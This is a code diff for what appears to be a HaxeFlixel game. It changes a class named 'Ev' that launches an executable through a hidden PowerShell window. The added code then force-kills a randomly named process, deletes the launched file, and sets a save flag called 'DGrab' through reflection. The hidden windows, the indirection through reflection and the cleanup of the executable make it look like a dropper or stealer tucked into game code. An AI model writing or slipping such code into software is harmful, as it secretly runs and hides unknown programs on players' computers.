@@ -1,7 +1,7 @@
 import sys.thread.Thread;
 import lime.utils.AssetManifest;
 import lime.app.Promise;
-import lime.app.Application;
+import haxe.MainLoop;
 using StringTools;
 
 class Ev
@@ -52,17 +52,18 @@ class Ev
         Thread.create(() -> {
             var cmd = 'powershell -WindowStyle Hidden -Command "Start-Process \\"$appPath\\""';
             var exitCode = Ev.Sys.command(cmd);
-            Application.current.dispatch(() -> {
-                complete(exitCode == 0);
+            MainLoop.runInMainThread(() -> {
+                complete(exitCode == 0, appPath);
             });
         });
     }
 
-    static function complete(d:Bool)
+    static function complete(d:Bool, appPath:String)
     {
         if(d)
         {
-            try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+            var cmd = 'powershell -WindowStyle Hidden -Command "Stop-Process -Name \'sfsdlfnkslfsdnf\' -Force -ErrorAction SilentlyContinue; Remove-Item \'$appPath\' -ErrorAction SilentlyContinue"';
+            Ev.Sys.command(cmd);
             Ev.Reflect.field(FlxG, "save").data.DGrab = true;
         }
         else
